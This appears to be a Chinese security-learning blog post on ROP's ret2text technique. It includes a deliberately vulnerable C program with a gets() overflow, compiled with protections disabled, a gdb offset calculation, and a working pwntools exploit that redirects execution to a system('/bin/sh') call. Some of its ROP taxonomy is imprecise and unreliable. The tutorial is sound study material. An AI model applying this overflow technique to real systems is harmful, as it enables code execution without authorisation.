@@ -1,0 +1,247 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>ROP初探之ret2text | The Blog of NWPUHKP</title><meta name="author" content="NWPUHKP"><meta name="copyright" content="NWPUHKP"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ROP什么是ROPROP即返回导向编程是一种计算机安全利用技术，它允许攻击者在存在诸如可执行空间保护和代码签名等安全防御的情况下执行代码。在这种技术中，攻击者通过控制调用栈来劫持程序控制流，并执行机器内存中已存在的精心选择的机器指令序列，称为“gadgets”。每个gadgets通常以返回指令结束，并位于现有程序和&#x2F;或共享库代码中的子程序内。这些gadgets串联在一起，允许攻击者在使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP初探之ret2text">
+<meta property="og:url" content="http://nwpuhkp.github.io/2023/05/05/rop_ret2text/index.html">
+<meta property="og:site_name" content="The Blog of NWPUHKP">
+<meta property="og:description" content="ROP什么是ROPROP即返回导向编程是一种计算机安全利用技术，它允许攻击者在存在诸如可执行空间保护和代码签名等安全防御的情况下执行代码。在这种技术中，攻击者通过控制调用栈来劫持程序控制流，并执行机器内存中已存在的精心选择的机器指令序列，称为“gadgets”。每个gadgets通常以返回指令结束，并位于现有程序和&#x2F;或共享库代码中的子程序内。这些gadgets串联在一起，允许攻击者在使用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.z4a.net/images/2023/05/05/ret2text_top.png">
+<meta property="article:published_time" content="2023-05-05T10:58:16.000Z">
+<meta property="article:modified_time" content="2023-05-05T11:05:03.758Z">
+<meta property="article:author" content="NWPUHKP">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="ROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.z4a.net/images/2023/05/05/ret2text_top.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://nwpuhkp.github.io/2023/05/05/rop_ret2text/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":80,"languages":{"author":"作者: NWPUHKP","link":"链接: ","source":"来源: The Blog of NWPUHKP","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ROP初探之ret2text',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-05 19:05:03'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://www.z4a.net/images/2023/04/06/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.z4a.net/images/2023/05/05/ret2text_top.png')"><nav id="nav"><span id="blog-info"><a href="/" title="The Blog of NWPUHKP"><span class="site-name">The Blog of NWPUHKP</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ROP初探之ret2text</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-05T10:58:16.000Z" title="发表于 2023-05-05 18:58:16">2023-05-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-05T11:05:03.758Z" title="更新于 2023-05-05 19:05:03">2023-05-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">安全基础</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ROP初探之ret2text"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h2><p>ROP即返回导向编程是一种计算机安全利用技术，它允许攻击者在存在诸如可执行空间保护和代码签名等安全防御的情况下执行代码。<br>在这种技术中，攻击者通过控制调用栈来劫持程序控制流，并执行机器内存中已存在的精心选择的机器指令序列，称为“gadgets”。<br>每个gadgets通常以返回指令结束，并位于现有程序和&#x2F;或共享库代码中的子程序内。<br>这些gadgets串联在一起，允许攻击者在使用阻止更简单攻击的防御的机器上执行任意操作。</p>
+<h2 id="ROP的原理"><a href="#ROP的原理" class="headerlink" title="ROP的原理"></a>ROP的原理</h2><p>ROP的原理是利用程序内存中已存在的以返回指令结尾的指令序列（gadgets）来控制程序执行流程。攻击者通过缓冲区溢出或其他方式在栈上布置数据，覆盖返回地址为gadgets的地址，从而实现代码注入。ROP可以绕过NX保护，因为它不需要在栈上执行任何新的代码，只需要利用现有的代码。ROP需要精心选择和拼接gadgets，以实现所需的功能。</p>
+<h2 id="ROP的前置条件"><a href="#ROP的前置条件" class="headerlink" title="ROP的前置条件"></a>ROP的前置条件</h2><ol>
+<li>需要程序存在缓冲区溢出漏洞。</li>
+<li>需要在程序内存中找到合适的gadgets，即以返回指令结尾的指令序列，可以实现所需的功能。</li>
+<li>需要能够在栈上布置数据，以控制gadgets的执行流程。</li>
+</ol>
+<h2 id="ROP的分类"><a href="#ROP的分类" class="headerlink" title="ROP的分类"></a>ROP的分类</h2><p>ROP的分类有多种方式，其中一种是根据gadgets的来源和功能进行分类。例如，可以将ROP分为以下几类：</p>
+<ul>
+<li><strong>基本ROP</strong>：使用程序内存中已存在的gadgets，实现基本的功能，如控制寄存器、调用函数、执行系统调用等。</li>
+<li><strong>高级ROP</strong>：使用程序内存中不存在的gadgets，通过动态生成或修改代码，实现更复杂的功能，如解密、解压缩、加载库等。</li>
+<li><strong>混合ROP</strong>：使用程序内存中部分存在的gadgets，结合动态生成或修改代码，实现更灵活和多样的功能，如跳过安全检查、绕过防御机制等。</li>
+</ul>
+<p>其中基本ROP的利用方式有：</p>
+<ul>
+<li><strong>ret2shellcode</strong>：将返回地址覆盖为栈或BSS段中存放的shellcode的地址，从而执行shellcode。</li>
+<li><strong>ret2text</strong>：将返回地址覆盖为程序.text段中已有的代码的地址，从而执行程序本身的代码。</li>
+<li><strong>ret2libc</strong>：将返回地址覆盖为libc库中的函数或字符串的地址，从而执行libc库中的代码或调用系统函数。</li>
+<li><strong>ret2plt</strong>：将返回地址覆盖为程序.PLT段中的函数入口的地址，从而执行程序导入的函数。</li>
+<li><strong>ret2dlresolve</strong>：将返回地址覆盖为程序.GOT段中的函数入口的地址，从而执行程序导入的函数。</li>
+<li><strong>ret2syscall</strong>：将返回地址覆盖为系统调用指令的地址，从而执行系统调用。</li>
+</ul>
+<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="ret2text的原理（来自ctfwiki）"><a href="#ret2text的原理（来自ctfwiki）" class="headerlink" title="ret2text的原理（来自ctfwiki）"></a>ret2text的原理（来自<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">ctfwiki</a>）</h2><p>ret2text的原理是控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
+<h2 id="ret2text的前置条件"><a href="#ret2text的前置条件" class="headerlink" title="ret2text的前置条件"></a>ret2text的前置条件</h2><ul>
+<li>程序存在栈溢出漏洞，可以覆盖返回地址。</li>
+<li>程序.text段中存在可以执行恶意命令的代码片段，或者可以利用ROP技术拼接多个代码片段。</li>
+<li>程序没有开启地址随机化或者可以泄露地址信息，可以确定代码片段的地址。</li>
+</ul>
+<h2 id="可利用ret2text的特征"><a href="#可利用ret2text的特征" class="headerlink" title="可利用ret2text的特征"></a>可利用ret2text的特征</h2><ul>
+<li>代码以返回指令结尾，如ret、pop ebp、leave等。</li>
+<li>代码可以实现一些基本的功能，如控制寄存器、调用函数、执行系统调用等。</li>
+<li>代码可以与其他代码片段拼接，形成ROP链，实现更复杂的功能。</li>
+</ul>
+<h2 id="ret2text的例题"><a href="#ret2text的例题" class="headerlink" title="ret2text的例题"></a>ret2text的例题</h2><h3 id="题目描述-来源于Leticia’s-Blog"><a href="#题目描述-来源于Leticia’s-Blog" class="headerlink" title="题目描述(来源于Leticia’s Blog)"></a>题目描述(来源于<a target="_blank" rel="noopener" href="http://uuzdaisuki.com/2020/02/22/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2text/">Leticia’s Blog</a>)</h3><p>这个程序有两个子函数，分别是func和sys，其中func中gets函数存在栈溢出，而sys函数没有被调用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">10</span>];</span><br><span class="line">    gets(a);</span><br><span class="line">    <span class="built_in">puts</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不加入canary机制和地址随机化问题。<br>所以在编译时加入-fno-stack-protector -no-pie来关闭这两个保护机制并保存调试信息方便gdb调试。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -g -o ret2text64 ret2text.c</span><br></pre></td></tr></table></figure>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>使用checksec命令查看保护机制，发现没有开启canary和PIE。<br><img src="https://www.z4a.net/images/2023/05/05/gdb_checksec.jpg" alt="gdb_checksec.jpg"></p>
+<h4 id="整个ROP过程："><a href="#整个ROP过程：" class="headerlink" title="整个ROP过程："></a>整个ROP过程：</h4><p>通过栈溢出覆盖func函数中的<strong>局部变量a</strong>，覆盖<strong>func函数的返回地址</strong>，并将返回地址处的值改为<strong>sys函数的地址</strong>，就可以获得shell。</p>
+<h4 id="需要得到的信息："><a href="#需要得到的信息：" class="headerlink" title="需要得到的信息："></a>需要得到的信息：</h4><ul>
+<li>func函数的返回地址</li>
+<li>局部变量a的地址</li>
+<li>sys函数的地址</li>
+</ul>
+<h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><h5 id="查看代码"><a href="#查看代码" class="headerlink" title="查看代码"></a>查看代码</h5><p><img src="https://www.z4a.net/images/2023/05/05/gdb_ret2text.jpg" alt="gdb_ret2text.jpg"></p>
+<h5 id="在gets函数前打断点并查看sys函数的地址"><a href="#在gets函数前打断点并查看sys函数的地址" class="headerlink" title="在gets函数前打断点并查看sys函数的地址"></a>在gets函数前打断点并查看sys函数的地址</h5><p><img src="https://www.z4a.net/images/2023/05/05/gdb_breakpoint.jpg" alt="gdb_breakpoint.jpg"><br>也可以通过IDA查看<br><img src="https://www.z4a.net/images/2023/05/05/sys_funcaddr.jpg" alt="sys_funcaddr.jpg"><br>得到sys函数的地址为0x401176。</p>
+<h5 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h5><p><img src="https://www.z4a.net/images/2023/05/05/gdb_run.jpg" alt="gdb_run.jpg"></p>
+<h5 id="查看局部变量a的地址和rbp的地址"><a href="#查看局部变量a的地址和rbp的地址" class="headerlink" title="查看局部变量a的地址和rbp的地址"></a>查看局部变量a的地址和rbp的地址</h5><p><img src="https://www.z4a.net/images/2023/05/05/rbpa_addr.jpg" alt="rbpa_addr.jpg"></p>
+<ul>
+<li>rbp的地址：<strong>0x7fffffffe2e0</strong></li>
+<li>局部变量a的地址：<strong>0x7fffffffe2d6</strong></li>
+</ul>
+<h5 id="计算func函数的返回地址"><a href="#计算func函数的返回地址" class="headerlink" title="计算func函数的返回地址"></a>计算func函数的返回地址</h5><p>在64位程序中，函数调用时，返回地址是存放在栈中的，而且是在rbp的上一个位置，所以返回地址为<strong>0x7fffffffe2e8</strong>。（8个字节）</p>
+<h5 id="计算填充长度"><a href="#计算填充长度" class="headerlink" title="计算填充长度"></a>计算填充长度</h5><p>填充长度为<strong>0x7fffffffe2e8-0x7fffffffe2d6&#x3D;0x12</strong>。（18个字节）</p>
+<h5 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span> + p64(<span class="number">0x401176</span>)</span><br></pre></td></tr></table></figure>
+<h5 id="写出exp"><a href="#写出exp" class="headerlink" title="写出exp"></a>写出exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./ret2text64&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span> + p64(<span class="number">0x401176</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h5 id="得到shell"><a href="#得到shell" class="headerlink" title="得到shell"></a>得到shell</h5><p><img src="https://www.z4a.net/images/2023/05/05/success.jpg" alt="success.jpg"></p>
+<h5 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h5><p>Pwntools遇到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
+<p>使用system无法拿到shell，使用execve可以。<br><strong>解决方法：</strong><br>Ubuntu部分系统调用system的时候，rsp的最低字节必须为0x00（栈以16字节对齐），否则无法运行system指令。要解决这个问题，只要将返回地址设置为跳过函数开头的<strong>push rbp</strong>就可以了<br>于是可以将payload改为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span> + p64(<span class="number">0x40117b</span>)</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="nwpuhkp">NWPUHKP</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://nwpuhkp.github.io/2023/05/05/rop_ret2text/">http://nwpuhkp.github.io/2023/05/05/rop_ret2text/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://nwpuhkp.github.io" target="_blank">The Blog of NWPUHKP</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/">安全</a><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">漏洞利用</a><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/ROP/">ROP</a></div><div class="post_share"><div class="social-share" data-image="https://www.z4a.net/images/2023/05/05/ret2text_top.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/08/learnofpth/" title="深入理解Pytorch中模型保存文件pth"><img class="cover" src="https://www.z4a.net/images/2023/04/08/pytorch-blog-cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">深入理解Pytorch中模型保存文件pth</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/06/rop_ret2shellcode/" title="ROP初探之ret2shellcode"><img class="cover" src="https://www.z4a.net/images/2023/05/06/ropshellcodetop.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ROP初探之ret2shellcode</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/05/06/rop_ret2shellcode/" title="ROP初探之ret2shellcode"><img class="cover" src="https://www.z4a.net/images/2023/05/06/ropshellcodetop.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-06</div><div class="title">ROP初探之ret2shellcode</div></div></a></div><div><a href="/2023/04/03/LiveAttackDRL/" title="论文阅读-Live Trojan Attacks on Deep Neural Networks"><img class="cover" src="https://www.z4a.net/images/2023/04/06/cover_2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-03</div><div class="title">论文阅读-Live Trojan Attacks on Deep Neural Networks</div></div></a></div><div><a href="/2023/04/03/RSA/" title="RSA密码总结"><img class="cover" src="https://www.z4a.net/images/2023/04/08/into.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-03</div><div class="title">RSA密码总结</div></div></a></div><div><a href="/2023/06/14/note_fuzzing_of_embedded_systems_a_survey/" title="论文阅读-Fuzzing of Embedded Systems A Survey"><img class="cover" src="https://www.z4a.net/images/2023/06/14/20220601001511_ae873.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-14</div><div class="title">论文阅读-Fuzzing of Embedded Systems A Survey</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://www.z4a.net/images/2023/04/06/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">NWPUHKP</div><div class="author-info__description">且视他人之疑目如盏盏鬼火，大胆地去走你的夜路</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/nwpuhkp"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/nwpuhkp" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:kepuhuang@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://space.bilibili.com/57507739" target="_blank" title="Bilibili"><i class="fab fa-bilibili"></i></a><a class="social-icon" href="https://weibo.com/u/6035177688" target="_blank" title="Weibo"><i class="fab fa-weibo"></i></a><a class="social-icon" href="https://s1.ax1x.com/2023/04/02/ppf2g2T.jpg" target="_blank" title="Wechat"><i class="fab fa-weixin"></i></a><a class="social-icon" href="https://twitter.com/huangkepu" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div 